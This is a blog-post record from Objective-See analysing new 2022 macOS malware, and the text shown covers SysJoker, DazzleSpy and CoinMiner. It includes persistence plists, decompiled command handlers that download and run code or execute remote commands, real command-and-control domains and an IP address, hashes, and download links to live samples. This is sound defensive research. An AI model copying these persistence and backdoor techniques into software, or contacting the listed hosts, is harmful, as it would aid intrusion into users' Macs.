{
    "id": "5f3d7ca5-8f68-40a2-a52a-e4ebb586d1e0",
    "created_at": "2023-04-05T02:08:37.065561Z",
    "updated_at": "2025-03-27T02:17:01.242061Z",
    "deleted_at": null,
    "sha1_hash": "8f02e50e937228476c2898f3f02dd74fd6a43340",
    "title": "2023-01-01 - The Mac Malware of 2022",
    "authors": "",
    "file_creation_date": "2023-04-03T08:33:39Z",
    "file_modification_date": "2023-04-03T08:33:39Z",
    "file_size": 11275387,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.org/blog/blog_0x71.html**\n\nThe Mac Malware of 2022 üëæ\n\nA comprehensive analysis of the year's new malware\n\nby: Patrick Wardle / January 1, 2023\n\nüìù üëæ Want to play along?\n[All samples covered in this post are available in our malware collection.](https://objective-see.com/malware.html)\n\n...just please don‚Äôt infect yourself! üòÖ\n\n## üñ®Ô∏è Printable\n\nA printable (PDF) version of this report can be found here:\n\n[The Mac Malware of 2022.pdf](https://objective-see.org/downloads/MacMalware_2022.pdf)\n\n## ‚åõ Background\n\nGoodbye 2022 ‚Ä¶and hello 2023! ü•≥\n\nFor the 7th year in a row, I‚Äôve put together a blog post that comprehensively covers all the\nnew Mac malware that appeared during the course of the year.\n\nWhile the specimens may have been reported on before (i.e. by the AV company that\ndiscovered them), this blog aims to cumulatively and comprehensively cover all the new Mac\nmalware of 2022 - in one place ‚Ä¶yes, with samples of each malware available for download.\n\nAfter reading this blog post, you should have a thorough understanding of recent threats\ntargeting macOS. This is especially important as Macs continue to flourish, especially\n[compared to other personal computers brands. In fact, an industry report from late 2022](https://www.idc.com/getdoc.jsp?containerId=prUS49755822)\nshowed that the year-over-year growth of all of the top 5 computer companies declined\nsignificantly ‚Ä¶except for Apple who saw a 40% increase!\n\n[This growth is especially apparent in the context of the enterprise so much that many believe](https://www.computerworld.com/article/3679730/jamf-q3-data-confirms-rapid-mac-adoption-across-the-enterprise.html)\n‚ÄúMac will become the dominant enterprise endpoint by 2030‚Äù:\n\n\n-----\n\nApple in the Enterprise\n‚Ä¶and unsurprisingly macOS malware continues following suit, becoming ever more\nprevalent (and insidious).\n\nIn this blog post, we focus on new Mac malware specimens or significant new variants that\nappeared in 2022. Adware and/or malware from previous years, are not covered.\nHowever at the end of this blog, I‚Äôve included a section dedicated to these other threats, that\nincludes a brief overview, and links to detailed write-ups.\n\nFor each malicious specimen covered in this post, we‚Äôll discuss the malware‚Äôs:\n\n**Infection Vector:**\n\nHow it was able to infect macOS systems.\n\n**Persistence Mechanism:**\n\nHow it installed itself, to ensure it would be automatically restarted on reboot/user login.\n\n**Features & Goals:**\n\nWhat was the purpose of the malware? a backdoor? a cryptocurrency miner? or\nsomething more insidious‚Ä¶\n\n**Indicators of Compromise:**\n\nWhat are the observable ‚Äúsymptoms‚Äù of the malware ‚Ä¶including its executable\ncomponents, created files/directories, and of course (if relevant) address of network\nendpoints such as command and control servers.\n\nAlso, for each malware specimen, I‚Äôve added a direct download link to the malware\nspecimen should you want to follow along with my analysis or dig into the malware more\nyourself. #SharingIsCaring\n\n## üóìÔ∏è Timeline\n\nBelow is a timeline highlighting the new macOS malware of 2022, covered in this post:\n\n\n-----\n\n## üõ†Ô∏è Malware Analysis Tools & Tactics\n\nBefore we dive in, let‚Äôs briefly mention malware analysis tools.\n\nThroughout this blog, I reference various tools used in analyzing the malware specimens.\n\nWhile there are a myriad of malware analysis tools, these are some of my own tools, and\nother favorites, and include:\n```\n   ProcessMonitor\n\n```\nMy open-source utility that monitors process creations and terminations, providing\ndetailed information about such events.\n```\n   FileMonitor\n\n```\nMy open-source utility that monitors file events (such as creation, modifications, and\ndeletions) providing detailed information about such events.\n```\n   DNSMonitor\n\n```\nMy open-source utility that monitors DNS traffic providing detailed information domain\nname questions, answers, and more.\n```\n   WhatsYourSign\n\n```\nMy open-source utility that displays code-signing information, via the UI.\n```\n   Netiquette\n\n```\nMy open-source (light-weight) network monitor.\n```\n   lldb\n\n```\nThe de-facto commandline debugger for macOS. Installed (to /usr/bin/lldb) as part\nof Xcode.\n\n[Suspicious Package\nA tools for ‚Äúinspecting macOS Installer Packages‚Äù (.pkgs), which](https://mothersruin.com/software/SuspiciousPackage/)\nalso allows you to easily extract files directly from the .pkg.\n```\n   Hopper Disassembler\n\n```\nA ‚Äúreverse engineering tool (for macOS) that lets you disassemble, decompile and\ndebug your applications‚Äù ‚Ä¶or malware specimens.\n\nüìö Interested in general Mac malware analysis techniques?\n\n\n-----\n\nYou're in luck, as I've written a book\non this topic:\nThe Art Of Mac Malware, Vol. 0x1:\nAnalysis\n\n## üëæ SysJoker\n\nSysJoker is a simple cross-platform backdoor supporting download and execute capabilities.\n\n[Download: SysJoker (password: infect3d)](https://github.com/objective-see/Malware/raw/main/SysJoker.zip)\n```\nSysJoker was discovered by Intezer, initially on a Linux server. However further research by\n\n```\n[Intezer researchers Avigayil,](https://twitter.com/AbbyMCH) [Nicole, and](https://twitter.com/NicoleFishi19) [Ryan uncovered a macOS variant as well:](https://twitter.com/MhicRoibin)\n\n\n-----\n\n_SysJoker was first discovered during an active attack on a Linux-based web server of_\n_a leading educational institution. After further investigation, we found that SysJoker_\n_also has Mach-O and Windows PE versions.\" -Intezer_\n\n[üÉèJust published a new research analyzing the #SysJoker backdoor.](https://twitter.com/hashtag/SysJoker?src=hash&ref_src=twsrc%5Etfw)\n\nSysJoker targets Windows, Linux and macOS.\n\nLearn more about this new threat, its capabilities, behavior and (most importantly) how\nto detect it ->\n\n[https://t.co/9iOAA5SjSj@NicoleFishi19](https://t.co/9iOAA5SjSj) [@MhicRoibin](https://twitter.com/MhicRoibin?ref_src=twsrc%5Etfw) [pic.twitter.com/siBA5OMiI5](https://t.co/siBA5OMiI5)\n\n[‚Äî Avigayil Mechtinger (@AbbyMCH) January 11, 2022](https://twitter.com/AbbyMCH/status/1480932289454518279?ref_src=twsrc%5Etfw)\n\n**Writeups:**\n\n[‚ÄúSysJoker: The first (macOS) malware of 2022‚Äù](https://objective-see.com/blog/blog_0x6C.html)\n\n[‚ÄúNew SysJoker Backdoor Targets Windows, Linux, and macOS‚Äù](https://www.intezer.com/blog/incident-response/new-backdoor-sysjoker/)\n\n**Infection Vector: Unknown, possible via infected npm packages**\n\nIntezer did not disclose how the macOS variant of SysJoker spreads or infects Mac systems,\nthough mused that, ‚Äúa possible attack vector for this malware is via an infected npm\n_package.‚Äù What is known is that the macOS variant is named types-config.ts to_\nmasquerade as a typescript file.\n\nUsing macOS‚Äô built-in file command we can see that in reality it‚Äôs a universal (‚Äúfat‚Äù) mach-O\nbinary, containing both Intel and arm64 builds:\n```\n% file SysJoker/types-config.ts\n\nSysJoker/types-config.ts: Mach-O universal binary with 2 architectures:\n\n[x86_64:Mach-O 64-bit executable x86_64] / [arm64:Mach-O 64-bit executable arm64]\n\nSysJoker/types-config.ts (for architecture x86_64): Mach-O 64-bit executable x86_64\n\nSysJoker/types-config.ts (for architecture arm64):  Mach-O 64-bit executable arm64\n\n\n```\nThe arm64 build ensures the malware can run natively on Apple Silicon (M1/M2).\n```\nWhatsYourSign, my open-source utility that displays code-signing information via the UI,\n\n```\nshows that this binary is signed, albeit via an adhoc signature:\n\n\n-----\n\nSysJoker signed, though ad-hoc\n\n**Persistence: Launch Item**\n```\nSysJoker persists as a launch agent (com.apple.update.plist).\n\n\n```\nRun the string utility to extracted any embedded (ASCII) strings, reveals both the launch\nagent path (/Library/LaunchAgents/com.apple.update.plist) as well an embedded\nlaunch item property list template (com.apple.update.plist) for persistence.\n\n\n-----\n\n```\n% strings SysJoker/types config.ts \n\n...\n\n/Library/LaunchAgents\n\n/Library/LaunchAgents/com.apple.update.plist\n\n...\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\n<plist version=\"1.0\">\n\n<dict>\n\n<key>Label</key>\n\n<string>com.apple.update</string>\n\n    <key>LimitLoadToSessionType</key>\n\n    <string>Aqua</string>\n\n<key>ProgramArguments</key>\n\n<array>\n\n<string>\n\n</string>\n\n</array>\n\n<key>KeepAlive</key>\n\n    <dict>\n\n      <key>SuccessfulExit</key>\n\n      <true/>\n\n    </dict>\n\n    <key>RunAtLoad</key>\n\n    <true/>\n\n</dict>\n\n</plist>\n\n...\n\n```\nAs the malware appears to be written in C++, which rather complex to statically reverse, its\neasier to lean on dynamic analysis tools to observe it‚Äôs persistence.\n\nVia my `ProcessMonitor, we can run the malware in a VM and observe many of the`\nmalware‚Äôs actions, such as the fact that when initially run, it copies itself to the user‚Äôs\n```\nLibrary/MacOsServices/ directory, as updateMacOs ‚Ä¶and then launches this copy:\n\n```\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n\n \"process\" : {\n\n  ...\n\n  \"arguments\" : [\n\n   \"cp\",\n\n   \"./types-config.ts\",\n\n   \"/Users/user/Library/MacOsServices/updateMacOs\"\n\n  ],\n\n  \"path\" : \"/bin/cp\",\n\n  \"name\" : \"cp\",\n\n  \"pid\" : 1404\n\n }\n\n ...\n\n}\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n\n \"process\" : {\n\n  ...\n\n  \"arguments\" : [\n\n   \"sh\",\n\n   \"-c\",\n\n   \"nohup '/Users/user/Library/MacOsServices/updateMacOs' >/dev/null 2>&1 &\"\n\n  ],\n\n  \"path\" : \"/bin/bash\",\n\n  \"name\" : \"bash\",\n\n  \"pid\" : 1405\n\n }\n\n ...\n\n}\n\n\n```\nIf one has [BlockBlock installed, it will detects the malware attempting to persist:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nSysJoker's persistence\nAllowing the malware to persist, allows us to take a peek at the property list,\n```\ncom.apple.update.plist it creates:\n% cat ~/Library/LaunchAgents/com.apple.update.plist                \n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\n<plist version=\"1.0\">\n\n<dict>\n\n  <key>Label</key>\n\n  <string>com.apple.update</string>\n\n  <key>LimitLoadToSessionType</key>\n\n  <string>Aqua</string>\n\n  <key>ProgramArguments</key>\n\n  <array>\n\n    <string>/Users/user/Library/MacOsServices/updateMacOs</string>\n\n  </array>\n\n  <key>KeepAlive</key>\n\n  <dict>\n\n  <key>SuccessfulExit</key>\n\n  <true/>\n\n  </dict>\n\n  <key>RunAtLoad</key>\n\n  <true/>\n\n</dict>\n\n</plist>\n\n\n\n```\nNo surprises here. The launch agent plist (populated from the template we saw as an\nembedded string) points the malware‚Äôs copy:\n```\n/Users/user/Library/MacOsServices/updateMacOs And as the RunAtLoad key is set to\n\n```\n\n-----\n\n```\ntrue, the malware will be restarted each time the user logs in.\n\n```\n**Capabilities: Persistent Backdoor (supporting download and execute).**\n\nDebugging the malware (in an isolated VM) reveals it first performs a simple survey of its\nhost. This survey is then sent to the malware‚Äôs remote command & control server (graphic```\nupdater.com) when the malware initially checks in:\n(lldb) x/s $rdx\n\n0x7fda91cafef0: \"serial=user_x&name=user&os=os&anti=av&ip=ip&user_token=987217232\"\n\n\n\n```\nWhile this (brief) survey information contains the name of the logged in user (user on my\nanalysis VM), other fields seems to be unset (ip=ip), or hard coded (e.g. 987217232).\n\nAside from this basic survey ‚Äúcapability‚Äù SysJoker supports a command to download and\nexecute a binary, as well as running arbitrary commands:\n\nThe Intezer [report notes that all versions (Linux, Windows, and Mac) support commands](https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/)\nnamed exec and cmd:\n\n\"[the exec] command is in charge of dropping and running an executable. SysJoker will\n_receive a URL to a zip file, a directory for the path the file should be dropped to, and a_\n_filename that the malware should use on the extracted executable. It will download this_\n_file, unzip it and execute it.\"_\n\n_[the cmd] command is in charge of running a command and uploading its response to_\n_the C2.\" -Intezer_\n\nDisassembling the Mac version of SysJoker, we find the function (at 0x0000000100005f80)\nresponsible for parsing the tasking from the command and control server, including the\naforementioned exec and cmd commands.\n\nFirst, the exec command:\n\n\n-----\n\n```\n 1int sub_100005f80(...) {\n\n 2  \n\n 3  rax = std::__1::basic_string::compare(&var_E0, 0x0, 0xffffffffffffffff, \"exe\",\n0x3);\n\n 4  if (rax == 0x0) goto handleExec;\n\n 5  ...\n\n 6\n 7handleExec:\n\n 8\n 9 rax = sub_100004e76(&var_60, \"url\");\n\n10 rax = sub_100004e76(&var_60, \"dir\");\n\n11 rax = sub_100004e76(&var_60, \"name\");\n\n12 ...  \n\n13  \n\n14}\n\n```\nIn the above disassembly you can see that if malware is tasked with the exec command, it\nwill first extract the command‚Äôs parameters (url, dir, name, etc.).\n\nThe code to then unzip the downloaded executable and execute it, appears at\n```\nsub_100003995. This function invokes:\n   unzip -o to unzip the executable,\n   chmod 0777 to change the permissions (on the now unzipped executable)\n   system to execute the binary.\n\n```\nThe function (at 0x0000000100005f80) is also responsible for handling the cmd command. In\nthe following disassembly the malware first looks for the string cmd coming from the\ncommand & control server. If tasked with this command it invokes an unnamed subroutine\n(sub_100004e76):\n```\n 1int sub_100005f80(...) {\n\n 2  \n\n 3  ...\n\n 4\n 5  rax = std::basic_string::compare(&var_E0, 0x0, 0xffffffffffffffff, \"cmd\", 0x3);\n\n 6  if (rax == 0x0) {\n\n 7   ...\n\n 8   rax = sub_100004e76(&var_60, \"command\");\n\n 9   ...\n\n10  }\n\n11}\n\n```\nAfter extracting the commands parameter (command), it appears to invoke the popen API (via\na helper function found at 0x000000010000256b), to execute the command. As noted by\nIntezer, the results of the executed command will be uploaded to the command and control\nserver.\n\n\n-----\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for SysJoker include the following (credit: Intezer):\n\nExecutable Components:\n```\n      /Library/MacOsServices/updateMacOs:\n      1a9a5c797777f37463b44de2b49a7f95abca786db3977dcdac0f79da739c08ac\n      fe99db3268e058e1204aff679e0726dc77fd45d06757a5fda9eafc6a28cfb8df\n      d0febda3a3d2d68b0374c26784198dc4309dbe4a8978e44bb7584fd832c325f0\n\n```\nFiles/Directories:\n```\n      /Library/MacOsServices\n      /Library/LaunchAgents/com.apple.update.plist\n\n```\nCommand and Control Servers:\n```\n      bookitlab.tech\n      winaudio-tools.com\n      graphic-updater.com\n      github.url-mini.com\n      office360-update.com\n\n## üëæ DazzleSpy\n\n```\nA feature complete cyber-espionage implant, DazzleSpy was deployed via a Safari (0day?)\nexploit and targeted pro-democracy protestors.\n\n[Download: DazzleSpy (password: infect3d)](https://github.com/objective-see/Malware/raw/main/DazzleSpy.zip)\n\n[Researchers Marc-Etienne M.L√©veill√© and](https://twitter.com/marc_etienne_) [Anton Cherepanov of ESET discovered](https://twitter.com/cherepanov74)\nDazzledSpy. They published their findings and research in an excellent writeup detailed:\n[‚ÄúWatering hole deploys new macOS malware, DazzleSpy, in Asia‚Äù:](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)\n\n\n-----\n\n**Writeups:**\n\n[‚ÄúWatering hole deploys new macOS malware, DazzleSpy, in Asia‚Äù](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)\n\n[‚ÄúAnalyzing OSX.DazzleSpy: A Fully-featured Cyber-espionage macOS Implant‚Äù](https://objective-see.org/blog/blog_0x6D.html)\n\n**Infection Vector: Safari Exploit**\n\nIts rather uncommon to discover Mac malware that is deployed by means of a browser\nexploit ‚Ä¶but this is exactly how DazzleSpy was able to infect its victims, as ESET notes:\n\n\"[A] Hong Kong pro-democracy radio station website [was] compromised to serve a\n_Safari exploit that installed cyberespionage malware on site visitors' Macs. Here we_\n_provide a breakdown of the WebKit exploit used to compromise Mac users and an_\n_analysis of the payload, which is a new malware family targeting macOS.\" -ESET_\n\nTo infect Mac users, the attackers first compromised a legitimate website and injected an\niFrame containing an exploit chain.\n\nThe ESET researchers noted the exploit chain would first check the installed version of\nmacOS, attempting to exploit users running macOS 10.15.2 or newer. The complex exploit\ncode was found in a file named mac.js. This would exploit what appeared to be CVE-2021```\n1789. Then upon success (read: initial code execution), would exploit a privilege escalation\n\n```\nvulnerability (CVE-2021-30869) to escape the Safari sandbox and gain root. Finally the\nexploit chain would complete, but downloading and decrypting payload: DazzleSpy.\n\n\n-----\n\nFor more details on this rather involved exploitation chain, see either ESET s [report or the](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)\n[Google TAG report, ‚ÄúAnalyzing a watering hole campaign using macOS exploits‚Äù.](https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/)\n\n**Persistence: Launch Agent**\n\nThe ESET researchers noted:\n\n\"In order to persist on the compromised device, the malware adds a Property List file ...\n_named com.apple.softwareupdate.plist to the LaunchAgents folder. The malware_\n_executable file is named softwareupdate and saved in the $HOME/.local/ folder.\" -_\nESET\n\nIn output from the strings tool (run against the DazzleSpy binary named softwareupdate),\none can see persistence-related strings such as %@/Library/LaunchAgents and\n```\ncom.apple.softwareupdate.plist:\n% strings - DazzleSpy/softwareupdate\n\n...\n\n%@/Library/LaunchAgents\n\n/com.apple.softwareupdate.plist\n\nlaunchctl unload %@\n\nRunAtLoad\n\nKeepAlive\n\n\n\n```\nIn a disassembler, we find cross-references to these strings in the aforementioned\n```\ninstallDaemon method (of the class named Singleton):\n\n```\n\n-----\n\n```\n 1/ @class Singleton /\n\n 2+(void)installDaemon {\n\n 3...\n\n 4\n 5rax = NSHomeDirectory();\n\n 6var_78 = [NSString stringWithFormat:@\"%@/Library/LaunchAgents\", rax];\n\n 7var_80 = [var_78 stringByAppendingFormat:@\"/com.apple.softwareupdate.plist\"];\n\n 8if ([var_70 fileExistsAtPath:var_78] == 0x0) {\n\n 9  [var_70 createDirectoryAtPath:var_78 withIntermediateDirectories:0x1 ...];\n\n10...\n\n11\n12var_90 = [[NSMutableDictionary alloc] init];\n\n13var_98 = [[NSMutableArray alloc] init];\n\n14[var_98 addObject:var_38];\n\n15[var_98 addObject:@\"1\"];\n\n16rax = @(YES);\n\n17[var_90 setObject:rax forKey:@\"RunAtLoad\"];\n\n18rax = @(YES);\n\n19[var_90 setObject:rax forKey:@\"KeepAlive\"];\n\n20rax = @(YES);\n\n21[var_90 setObject:rax forKey:@\"SuccessfulExit\"];\n\n22[var_90 setObject:@\"com.apple.softwareupdate\" forKey:@\"Label\"];\n\n23[var_90 setObject:var_98 forKey:@\"ProgramArguments\"];\n\n24\n25[var_90 writeToFile:var_80 atomically:0x0];\n\n```\nIn the above decompilation, we first see the malware build the path to a launch agent plist\n(~/Library/LaunchAgents/com.apple.softwareupdate.plist).\n\nThen, it initializes a dictionary for the launch agent plist, with various key value pairs\n(RunAtLoad, etc). Once initialized this dictionary is written out to the launch agent plist\n(com.apple.softwareupdate.plist).\n\nWe can passively observe the malware (recall, named softwareupdate) dynamically\n[creating this plist via a File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n\n\n-----\n\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n\n \"file\" : {\n\n  \"destination\" :\n\"/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist\",\n\n  \"process\" : {\n\n   \"signing info (computed)\" : {\n\n    \"signatureStatus\" : -67062\n\n   },\n\n   \"uid\" : 501,\n\n   \"arguments\" : [\n\n    \"/Users/user/Desktop/softwareupdate\"\n\n   ],\n\n   \"path\" : \"/Users/user/Desktop/softwareupdate\",\n\n   \"pid\" : 1469\n\n  }\n\n }\n\n}\n\n\n```\nOnce the malware‚Äôs launch agent‚Äôs plist has been created, we can easily dump its contents:\n```\n% cat /Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\n<plist version=\"1.0\">\n\n<dict>\n\n  <key>KeepAlive</key>\n\n  <true/>\n\n  <key>Label</key>\n\n  <string>com.apple.softwareupdate</string>\n\n  <key>ProgramArguments</key>\n\n  <array>\n\n    <string>/Users/user/.local/softwareupdate</string>\n\n    <string>1</string>\n\n  </array>\n\n  <key>RunAtLoad</key>\n\n  <true/>\n\n  <key>SuccessfulExit</key>\n\n  <true/>\n\n</dict>\n\n</plist>\n\n\n\n```\nIn the ProgramArguments key we can see the path to the persistent location of the malware:\n```\n~/.local/softwareupdate. Also, as the RunAtLoad key is set to true, the malware will be\n\n```\nautomatically restarted each time the user logs in. Persistence achieved!\n\n\n-----\n\n**Capabilities: Fully-feature implant**\n\nThe ESET [report also describes the tasking (remote) commands that DazzleSpy supports.](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)\nThis includes everything you‚Äôd expect to find in a cyber-espionage implant, including\nsurveying the infected host, exfiltrating files, running commands, self-deletion.\n\n\n-----\n\nDazzleSpy's Capabilities (image credit: ESET)\nInterestingly, the malware (again, as noted by ESET), also supports more advanced features\nsuch as:\n\nThe ability to search for files (via regex?)\n\nThe ability to start fully interactive remote desktop (RDP) session\n\nThe ability to dump the keychain (on systems vulnerable to CVE-2019-8526).\n\nCVE-2019-8526 was found by Linus Henze, and presented at our very own #OBTS\nconference:\n\nSee:\n\n[KeySteal: A Vulnerability in Apple's Keychain](https://objectivebythesea.com/v2/talks/OBTS_v2_Henze.pdf)\nThe handling of remote commands (tasking) seems to be implemented in the analysisData:\n```\nSocket: method. Here the malware looks for tasking commands from the command and\n\n```\ncontrol server, and then acts upon them. For example, here‚Äôs the decompilation of the run\ncommand, which opens (‚Äúruns‚Äù) a specified file (‚Äúpath‚Äù) via its default handler (via\n```\nNSWorkspace‚Äôs‚Äô openFile API):\n1if (YES == [command isEqualToString:@\"run\"]) {\n\n2  path = [var_888 objectForKeyedSubscript:@\"path\"];\n\n3  ...\n\n4  [NSWorkspace.sharedWorkspace openFile:path];\n\n5}\n\n```\n**Indicators of Compromise (IoCs):**\n\nIoCs for DazzleSpy include the following (credit: ESET):\n\n\n-----\n\nExecutable Components:\n```\n      ~/.local/softwareupdate:\n      f9ad42a9bd9ade188e997845cae1b0587bf496a35c3bffacd20fefe07860a348\n\n```\nFiles/Directories:\n```\n      ~/.local\n      ~/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n```\nCommand and Control Servers:\n```\n      88.218.192.128:5633\n\n## üëæ CoinMiner\n\n```\nCoinMiner is a surreptitious crypto currency miner, leveraging various open-source\ncomponents and I2P for stealthy encrypted communications.\n\n[Download: CoinMiner (password: infect3d)](https://github.com/objective-see/Malware/raw/main/CoinMiner.zip)\n\nIn February, TrendMicro security researchers published a thorough write-up on a new cryptocurrency miner (CoinMiner) titled ‚ÄúLatest Mac Coinminer Utilizes Open-Source Binaries and\nthe I2P Network‚Äù. As mentioned in the title of this write-up they described how the miner\nused various open-source components and I2P for its communications.\n\n**Writeups:**\n\n[‚ÄúLatest Mac Coinminer Utilizes Open-Source Binaries and the I2P Network‚Äù](https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html)\n\n**Infection Vector: (likely) Trojanized Disk Images**\n\n\n-----\n\nThe TrendMicro report states,\n\n\"We suspected that the Mach-O sample arrived packaged in a DMG (an Apple image\nformat used to compress installers) for Adobe Photoshop CC 2019 v20.0.6\" TrendMicro\n\nThe report notes that this conclusion was reached due to a code snippet which (as part of\nthe malware installation logic) would launch a binary from the hardcoded path:\n```\n/Volumes/Adobe Photoshop\\ CC 2019\\ v20.0.6/Adobe Zii\\ 2019\n4.4.2.app/Contents/MacOS/.Patch\n\n```\nReversing one of the malware‚Äôs binaries (lauth), this code is readily apparent the\ndisassembly of the main function:\n```\n1int main(...) {\n\n2  \n\n3  ...\n\n4  system(\"/Volumes/Adobe\\ Photoshop\\ CC\\ 2019\\ v20.0.6/Adobe\\ Zii\\ 2019\\\n\n5      4.4.2.app/Contents/MacOS/.Patch &\");\n\n6\n\n7  return 0x0;\n\n8}\n\n```\nZii is well known patcher tool that claims to allow users to subvert Adobe products\n(Photoshop, etc) bypassing otherwise required registration and licensing checks. Its\nunsurprising that here hackers have packed inserted some malware as well.\n\nStill the user is expecting Zii to run, hence it makes sense for the malware to launch it, such\nthat nothing appears amiss.\n\n**Persistence: Launch Daemon**\n\nThe same binary, lauth also persists the malware via a launch daemon:\n```\n/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist.\n\n```\nIn order to install a launch daemon, one much have root privileges. Easy enough, the parent\nprocess of lauth (which presumably is run by the user as the main binary on the infected\ndisk image) simply asks the user via the AuthorizationExecuteWithPrivileges API.\n\n\n-----\n\n```\n 1int main(...) {\n\n 2  ...\n\n 3\n 4  fwrite(__lauth, 0x1, 0xd03c70, fopen(\"/tmp/lauth\", \"wb\"));\n\n 5  system(\"chmod +x /tmp/lauth\");\n\n 6  ...\n\n 7\n 8  AuthorizationCreate(0x0, 0x0, 0x0, &var_40);\n\n 9  AuthorizationExecuteWithPrivileges(var_40, \"/tmp/lauth\", 0x0, &var_30,\n&var_38);\n\n10  \n\n11}\n\n```\nInvoking the AuthorizationExecuteWithPrivileges API will result in a password prompt,\nand if the user enters the appropriate credentials will execute a specified (here the lauth\nbinary) will elevated privileges.\n\nWith such elevated privileges, the malware can now persist as launch daemon.\n\nBack to the disassembly of the lauth binary, we find an embedded launch item property list:\n\nEmbedded Launch Item Plist\nThe malware will write this embedded property list to\n```\n/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist and then launch it (via\nlaunchctl load‚Ä¶as shown in the following disassembly:\n\n```\n\n-----\n\n```\n 1int main(...) {\n\n 2  ...\n\n 3\n 4  fopen(\"/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist\", \"wb\"));\n\n 5  fwrite(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE plist PUBLIC ...\n\n 6      \"<plist version=\\\"1.0\\\">\\n<dict>\\n\\t<key>Label</key>\\n\\t\n\n 7      \"\n<string>com.adobe.acc.installer.v1</string>\\n\\t<key>ProgramArguments‚Ä¶\");\n\n 8  ...\n\n 9  system(\"launchctl load\n/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist\");\n\n10  \n\n11}\n\n```\nAs the RunAtLoad key is set to true, the persisted item\n```\n/usr/local/bin/com.adobe.acc.installer.v1 will be (re)executed each time the infected\n\n```\nsystem is rebooted.\n\n**Capabilities: Crypto-Currency Miner**\n```\nCoinMiner main (and only?) objective is to surreptitiously mine crypto-currency. This is\n\n```\naccomplished by executing a binary (it has installed) named com.adobe.acc.localhost.\n(This binary is spawned by the launch daemon‚Äôs binary:\n```\n/usr/local/bin/com.adobe.acc.installer.v1).\n\n```\nThe TrendMicro report explains that the com.adobe.acc.localhost binary is simply,\n‚Äúmodified [open-source] XMRig command-line [miner] app‚Äù. This can be confirmed (as they\nnote), by executing it with the --help commandline option:\n```\n% ./com.adobe.acc.localhost --help\n\nUsage: xmrig [OPTIONS]\n\nOptions:\n\n -a, --algo=ALGO     specify the algorithm to use\n\n               cryptonight\n\n               cryptonight-lite\n\n               cryptonight-heavy\n\n -o, --url=URL      URL of mining server\n\n -O, --userpass=U:P    username:password pair for mining server\n\n -u, --user=USERNAME   username for mining server\n\n -p, --pass=PASSWORD   password for mining server\n\n   --rig-id=ID     rig identifier for pool-side statistics (needs pool\nsupport)\n\n -t, --threads=N     number of miner threads\n\n\n```\nConfiguration information for miner can be found (as pointed out by the TrendMicro\nresearchers) embedded within the com.adobe.acc.localhost binary:\n\n\n-----\n\nEmbedded Miner Configuration\nThis configuration includes the url of the miner server, user name and password:\n```\n   url: 127.0.0.1:4545\n   user: pshp\n   password: x\n\n```\nA localhost (127.0.0.1) address for the mining server seems strange, and until we realize\nthat malware installs a I2P listener on localhost, port 4545\n\nRegarding I2P, Wikipedia notes that,\n‚ÄúThe Invisible Internet Project (I2P) is an anonymous network layer that allows for\ncensorship-resistant, peer-to-peer communication.‚Äù\n\nVia macOS built-in lsof command you can see the listener on port 4545:\n```\n% lsof -i -P -n\n\nCOMMAND  PID USER  FD  TYPE       DEVICE SIZE/OFF NODE NAME\n\n...\n\ncom.adobe 2844 user  11u IPv4    0t0 TCP *:15899 (LISTEN)\n\ncom.adobe 2844 user  23u IPv4    0t0 UDP *:15899\n\ncom.adobe 2844 user  30u IPv4    0t0 TCP 127.0.0.1:4545 (LISTEN)\n\n```\nAs TrendMicro notes,\n\n\"We can conclude that the XMRig traffic to 127.0.0.1:4545 will be tunneled by i2pd to\n\n[and IP2 endpoint].\" ...\n-TrendMicro\n\n‚Ä¶and why use I2P?, rather simply as the TrendMicro researchers state, ‚Äúto hide its network\ntraffic from the untrained eye.‚Äù\n\n**Indicators of Compromise (IoCs):**\n\n\n-----\n\nThere are a myriad of samples (and thus IoCs) for CoinMiner.\n\n[TrendMicro, has published a file solely containing such IoCs, which should be consulted.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network/IOCs-Mac%20Coinminer.txt)\nHowever, we list a few here (credit: TrendMicro):\n\nExecutable Components:\n```\n      /tmp/lauth:\n      fe3700a52e86e250a9f38b7a5a48397196e7832fd848a7da3cc02fe52f49cdcf\n      /usr/local/bin/com.adobe.acc.localhost:\n      